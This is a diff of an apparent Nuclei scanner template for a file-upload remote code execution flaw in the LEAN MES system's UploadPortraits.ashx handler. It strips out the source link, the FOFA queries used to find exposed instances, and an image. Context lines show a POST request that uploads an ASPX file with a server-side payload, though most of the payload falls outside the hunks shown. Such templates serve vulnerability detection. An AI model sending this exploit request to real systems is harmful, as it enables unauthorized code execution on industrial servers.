@@ -3,12 +3,8 @@ info:
   name: 深科特LEAN MES系统 UploadPortraits.ashx 存在文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/coh0c42tssbb6gsh'
+  description: ''
   tags: rce,file-upload,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: coh0c42tssbb6gsh
-    fofa: (title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png")
 http:
 - raw:
   - 'POST /Handler/UploadPortraits.ashx?UserId=1&Filename=1.aspx&Type=Upload HTTP/1.1
@@ -69,9 +65,7 @@ http:
 
     Response.End();%>
 
-    ------WebKitFormBoundary7ctER307B0RaQwOp--
-
-    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1774777238003-b5aaad31-e213-40c6-a0ce-021b341147eb.png)'
+    ------WebKitFormBoundary7ctER307B0RaQwOp--'
   redirects: false
   matchers:
   - status:
